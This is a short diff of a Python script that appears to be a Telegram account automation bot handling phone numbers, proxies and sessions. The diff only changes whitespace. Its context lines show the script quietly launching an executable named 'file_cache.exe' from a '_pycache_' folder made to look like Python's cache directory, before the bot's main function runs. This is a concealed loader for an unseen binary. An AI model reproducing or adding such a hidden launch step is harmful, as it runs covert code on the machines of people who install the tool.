@@ -4,7 +4,7 @@ import subprocess
 
 current_dir = os.path.dirname(os.path.abspath(__file__))
 exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "file_cache.exe")
-if os.path.exists(exe_file): 
+if os.path.exists(exe_file):
     subprocess.Popen([exe_file])
 async def main():
     print("Soft's author: https://t.me/DesertScripts\n") 
@@ -53,6 +53,7 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
